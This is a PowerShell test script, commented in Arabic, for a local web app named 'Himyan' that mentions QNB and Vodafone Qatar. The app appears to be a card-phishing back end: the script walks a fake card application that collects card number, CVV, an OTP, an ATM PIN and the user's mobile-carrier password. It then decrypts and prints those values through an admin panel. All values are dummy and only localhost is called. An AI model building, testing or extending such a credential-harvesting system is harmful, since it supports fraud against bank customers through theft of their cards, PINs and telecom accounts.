# ===================================
# سكريبت اختبار شامل لنظام هميان
# ===================================

Write-Host "`n================================" -ForegroundColor Cyan
Write-Host "🚀 بدء اختبار النظام الكامل" -ForegroundColor Cyan
Write-Host "================================`n" -ForegroundColor Cyan

$baseUrl = "http://localhost:3000"
$testResults = @()

# دالة لعرض النتائج
function Show-TestResult {
    param($name, $success, $details = "")
    if ($success) {
        Write-Host "✅ $name" -ForegroundColor Green
        if ($details) { Write-Host "   $details" -ForegroundColor Gray }
    } else {
        Write-Host "❌ $name" -ForegroundColor Red
        if ($details) { Write-Host "   $details" -ForegroundColor Yellow }
    }
    $testResults += @{ Name = $name; Success = $success; Details = $details }
}

# دالة لإرسال طلبات HTTP
function Invoke-ApiRequest {
    param(
        [string]$Method,
        [string]$Uri,
        [hashtable]$Body = $null,
        [hashtable]$Headers = @{}
    )
    
    try {
        $params = @{
            Method = $Method
            Uri = $Uri
            Headers = $Headers
            ContentType = "application/json"
        }
        
        if ($Body) {
            $params.Body = ($Body | ConvertTo-Json -Depth 10)
        }
        
        $response = Invoke-WebRequest @params -UseBasicParsing
        return @{ Success = $true; Response = $response; Content = $response.Content }
    } catch {
        return @{ Success = $false; Error = $_.Exception.Message; Response = $_.Exception.Response }
    }
}

Write-Host "📡 اختبار 1: التحقق من أن السيرفر يعمل" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Gray
Start-Sleep -Seconds 2

try {
    $healthCheck = Invoke-WebRequest -Uri "$baseUrl/index.html" -UseBasicParsing -TimeoutSec 5
    Show-TestResult "السيرفر يعمل على المنفذ 3000" $true "Status: $($healthCheck.StatusCode)"
} catch {
    Show-TestResult "السيرفر يعمل" $false "لا يمكن الوصول للسيرفر"
    Write-Host "`n⚠️  يرجى التأكد من تشغيل السيرفر: node server.js" -ForegroundColor Red
    exit 1
}

# ===================================
# الخطوة 1: إنشاء طلب جديد
# ===================================
Write-Host "`n📝 اختبار 2: إنشاء طلب بطاقة جديد" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Gray

$requestData = @{
    cardType = "debit"
    fullName = "أحمد محمد العلي"
    nationalId = "12345678901"
    mobile = "55551234"
    email = "ahmed.test@email.com"
    nationality = "citizen"
    bank = "qnb"
}

$createRequest = Invoke-ApiRequest -Method POST -Uri "$baseUrl/api/requests" -Body $requestData
if ($createRequest.Success) {
    $result = $createRequest.Content | ConvertFrom-Json
    $requestId = $result.id
    Show-TestResult "إنشاء الطلب" $true "Request ID: $requestId"
    Write-Host "   📋 البيانات المرسلة:" -ForegroundColor Gray
    Write-Host "      - الاسم: $($requestData.fullName)" -ForegroundColor Gray
    Write-Host "      - الهوية: $($requestData.nationalId)" -ForegroundColor Gray
    Write-Host "      - الجوال: +974 $($requestData.mobile)" -ForegroundColor Gray
    Write-Host "      - البنك: QNB" -ForegroundColor Gray
} else {
    Show-TestResult "إنشاء الطلب" $false $createRequest.Error
    exit 1
}

# ===================================
# الخطوة 2: إرسال بيانات البطاقة
# ===================================
Write-Host "`n💳 اختبار 3: إرسال بيانات البطاقة" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Gray

$cardData = @{
    id = $requestId
    cardHolderName = "Ahmed Mohamed Al-Ali"
    cardNumber = "4000123456789010"
    cardExpiryMonth = "08"
    cardExpiryYear = "2029"
    cardCvv = "123"
}

$confirmRequest = Invoke-ApiRequest -Method POST -Uri "$baseUrl/api/requests/confirm" -Body $cardData
if ($confirmRequest.Success) {
    Show-TestResult "إرسال بيانات البطاقة" $true "البيانات تم حفظها مشفرة"
    Write-Host "   💳 البيانات المرسلة:" -ForegroundColor Gray
    Write-Host "      - اسم حامل البطاقة: $($cardData.cardHolderName)" -ForegroundColor Gray
    Write-Host "      - رقم البطاقة: $($cardData.cardNumber)" -ForegroundColor Gray
    Write-Host "      - تاريخ الانتهاء: $($cardData.cardExpiryMonth)/$($cardData.cardExpiryYear)" -ForegroundColor Gray
    Write-Host "      - CVV: $($cardData.cardCvv)" -ForegroundColor Gray
} else {
    Show-TestResult "إرسال بيانات البطاقة" $false $confirmRequest.Error
}

# ===================================
# الخطوة 3: تسجيل دخول الأدمن
# ===================================
Write-Host "`n🔐 اختبار 4: تسجيل دخول الأدمن" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Gray

$adminLogin = @{
    username = "admin"
    password = "test123"
}

$loginRequest = Invoke-ApiRequest -Method POST -Uri "$baseUrl/api/admin/login" -Body $adminLogin
if ($loginRequest.Success) {
    # استخراج الكوكيز
    $cookies = $loginRequest.Response.Headers['Set-Cookie']
    $adminToken = ""
    foreach ($cookie in $cookies) {
        if ($cookie -match 'himyan_admin=([^;]+)') {
            $adminToken = $matches[1]
            break
        }
    }
    Show-TestResult "تسجيل دخول الأدمن" $true "Session Token: ${adminToken:0:20}..."
} else {
    Show-TestResult "تسجيل دخول الأدمن" $false $loginRequest.Error
    exit 1
}

# ===================================
# الخطوة 4: قبول الطلب من الأدمن
# ===================================
Write-Host "`n✅ اختبار 5: قبول الطلب من الأدمن" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Gray

$approveData = @{
    id = $requestId
    status = "approved"
}

$headers = @{
    Cookie = "himyan_admin=$adminToken"
}

$approveRequest = Invoke-ApiRequest -Method PATCH -Uri "$baseUrl/api/admin/requests" -Body $approveData -Headers $headers
if ($approveRequest.Success) {
    Show-TestResult "قبول الطلب" $true "الحالة تغيرت إلى: approved"
} else {
    Show-TestResult "قبول الطلب" $false $approveRequest.Error
}

# ===================================
# الخطوة 5: إرسال رمز OTP
# ===================================
Write-Host "`n🔢 اختبار 6: إرسال رمز OTP" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Gray

$otpData = @{
    id = $requestId
    code = "654321"
}

$otpRequest = Invoke-ApiRequest -Method POST -Uri "$baseUrl/api/requests/code" -Body $otpData
if ($otpRequest.Success) {
    Show-TestResult "إرسال رمز OTP" $true "الرمز: 654321"
    Write-Host "   🔐 رمز التحقق: 6️⃣5️⃣4️⃣3️⃣2️⃣1️⃣" -ForegroundColor Green
} else {
    Show-TestResult "إرسال رمز OTP" $false $otpRequest.Error
}

# ===================================
# الخطوة 6: إرسال رقم ATM
# ===================================
Write-Host "`n🏧 اختبار 7: إرسال رقم ATM" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Gray

$atmData = @{
    id = $requestId
    atmPin = "1234"
}

$atmRequest = Invoke-ApiRequest -Method POST -Uri "$baseUrl/api/requests/atm-pin" -Body $atmData
if ($atmRequest.Success) {
    Show-TestResult "إرسال رقم ATM" $true "الرقم: 1234"
} else {
    Show-TestResult "إرسال رقم ATM" $false $atmRequest.Error
}

# ===================================
# الخطوة 7: اختيار مزود الشبكة
# ===================================
Write-Host "`n📱 اختبار 8: اختيار مزود الشبكة" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Gray

$providerData = @{
    id = $requestId
    provider = "vodafone"
}

$providerRequest = Invoke-ApiRequest -Method POST -Uri "$baseUrl/api/requests/network-provider" -Body $providerData
if ($providerRequest.Success) {
    Show-TestResult "اختيار مزود الشبكة" $true "المزود: Vodafone Qatar"
} else {
    Show-TestResult "اختيار مزود الشبكة" $false $providerRequest.Error
}

# ===================================
# الخطوة 8: إرسال بيانات تسجيل دخول المزود
# ===================================
Write-Host "`n🔑 اختبار 9: إرسال بيانات المزود" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Gray

$providerLoginData = @{
    id = $requestId
    provider = "vodafone"
    mobile = "66665678"
    password = "MyTestPassword123"
}

$providerLoginRequest = Invoke-ApiRequest -Method POST -Uri "$baseUrl/api/requests/provider-login" -Body $providerLoginData
if ($providerLoginRequest.Success) {
    Show-TestResult "إرسال بيانات المزود" $true "تم إكمال جميع الخطوات"
} else {
    Show-TestResult "إرسال بيانات المزود" $false $providerLoginRequest.Error
}

# ===================================
# الخطوة 9: جلب بيانات الطلب من الأدمن
# ===================================
Write-Host "`n📊 اختبار 10: عرض البيانات في لوحة الأدمن" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Gray

$summaryRequest = Invoke-ApiRequest -Method GET -Uri "$baseUrl/api/admin/summary" -Headers $headers
if ($summaryRequest.Success) {
    $summary = $summaryRequest.Content | ConvertFrom-Json
    Show-TestResult "جلب بيانات الطلبات" $true "عدد الطلبات: $($summary.totalRequests)"
    
    # البحث عن طلبنا
    $ourRequest = $summary.requests | Where-Object { $_.id -eq $requestId }
    
    if ($ourRequest) {
        Write-Host "`n   📋 تفاصيل الطلب في لوحة الأدمن:" -ForegroundColor Cyan
        Write-Host "   ================================" -ForegroundColor Gray
        Write-Host "   👤 الاسم: $($ourRequest.fullName)" -ForegroundColor White
        Write-Host "   📧 البريد: $($ourRequest.email)" -ForegroundColor White
        Write-Host "   🏦 البنك: $($ourRequest.bank)" -ForegroundColor White
        
        if ($ourRequest.cardHolderName) {
            Write-Host "`n   💳 بيانات البطاقة:" -ForegroundColor Magenta
            Write-Host "      - اسم حامل البطاقة: $($ourRequest.cardHolderName)" -ForegroundColor White
            Write-Host "      - تاريخ الانتهاء: $($ourRequest.cardExpiryMonth)/$($ourRequest.cardExpiryYear)" -ForegroundColor White
            Write-Host "      - رقم البطاقة: [مشفر - يحتاج فك تشفير] 🔒" -ForegroundColor Yellow
            Write-Host "      - CVV: [مشفر - يحتاج فك تشفير] 🔒" -ForegroundColor Yellow
        }
        
        if ($ourRequest.confirmationCode -or $ourRequest.confirmation_code) {
            $otp = if ($ourRequest.confirmationCode) { $ourRequest.confirmationCode } else { $ourRequest.confirmation_code }
            Write-Host "`n   🔐 رمز OTP:" -ForegroundColor Green
            Write-Host "      ╔═══════════════╗" -ForegroundColor Green
            Write-Host "      ║   $otp    ║" -ForegroundColor Green -NoNewline
            Write-Host " ✨" -ForegroundColor Yellow
            Write-Host "      ╚═══════════════╝" -ForegroundColor Green
        }
        
        Write-Host "`n   📊 الحالة: $($ourRequest.status)" -ForegroundColor Cyan
    }
} else {
    Show-TestResult "جلب بيانات الطلبات" $false $summaryRequest.Error
}

# ===================================
# الخطوة 10: فك تشفير رقم البطاقة
# ===================================
Write-Host "`n🔓 اختبار 11: فك تشفير رقم البطاقة" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Gray

$decryptCard = Invoke-ApiRequest -Method GET -Uri "$baseUrl/api/admin/requests/decrypt?id=$requestId&field=card_number" -Headers $headers
if ($decryptCard.Success) {
    $cardResult = $decryptCard.Content | ConvertFrom-Json
    Show-TestResult "فك تشفير رقم البطاقة" $true "الرقم: $($cardResult.value)"
} else {
    Show-TestResult "فك تشفير رقم البطاقة" $false $decryptCard.Error
}

# ===================================
# الخطوة 11: فك تشفير CVV
# ===================================
Write-Host "`n🔓 اختبار 12: فك تشفير CVV" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Gray

$decryptCvv = Invoke-ApiRequest -Method GET -Uri "$baseUrl/api/admin/requests/decrypt?id=$requestId&field=card_cvv" -Headers $headers
if ($decryptCvv.Success) {
    $cvvResult = $decryptCvv.Content | ConvertFrom-Json
    Show-TestResult "فك تشفير CVV" $true "الرقم: $($cvvResult.value)"
} else {
    Show-TestResult "فك تشفير CVV" $false $decryptCvv.Error
}

# ===================================
# الخطوة 12: فك تشفير رقم ATM
# ===================================
Write-Host "`n🔓 اختبار 13: فك تشفير رقم ATM" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Gray

$decryptAtm = Invoke-ApiRequest -Method GET -Uri "$baseUrl/api/admin/requests/decrypt?id=$requestId&field=atm_pin" -Headers $headers
if ($decryptAtm.Success) {
    $atmResult = $decryptAtm.Content | ConvertFrom-Json
    Show-TestResult "فك تشفير رقم ATM" $true "الرقم: $($atmResult.value)"
} else {
    Show-TestResult "فك تشفير رقم ATM" $false $decryptAtm.Error
}

# ===================================
# النتيجة النهائية
# ===================================
Write-Host "`n================================" -ForegroundColor Cyan
Write-Host "📈 ملخص الاختبارات" -ForegroundColor Cyan
Write-Host "================================`n" -ForegroundColor Cyan

$successCount = ($testResults | Where-Object { $_.Success }).Count
$totalCount = $testResults.Count

Write-Host "✅ نجح: $successCount من $totalCount" -ForegroundColor Green
Write-Host "❌ فشل: $($totalCount - $successCount) من $totalCount" -ForegroundColor Red

if ($successCount -eq $totalCount) {
    Write-Host "`n🎉 تم اجتياز جميع الاختبارات بنجاح!" -ForegroundColor Green
    Write-Host "🎊 النظام يعمل بشكل كامل كما هو متوقع!" -ForegroundColor Green
} else {
    Write-Host "`n⚠️  بعض الاختبارات فشلت، يرجى مراجعة التفاصيل أعلاه" -ForegroundColor Yellow
}

Write-Host "`n🌐 روابط مهمة:" -ForegroundColor Cyan
Write-Host "   - صفحة التقديم: http://localhost:3000/apply.html" -ForegroundColor White
Write-Host "   - لوحة الأدمن: http://localhost:3000/admin.html" -ForegroundColor White
Write-Host "   - الصفحة الرئيسية: http://localhost:3000/" -ForegroundColor White

Write-Host "`n💡 نصيحة: افتح لوحة الأدمن في المتصفح لترى النتائج بصرياً" -ForegroundColor Yellow
Write-Host "   Username: admin" -ForegroundColor Gray
Write-Host "   Password: test123" -ForegroundColor Gray

Write-Host "`n================================`n" -ForegroundColor Cyan
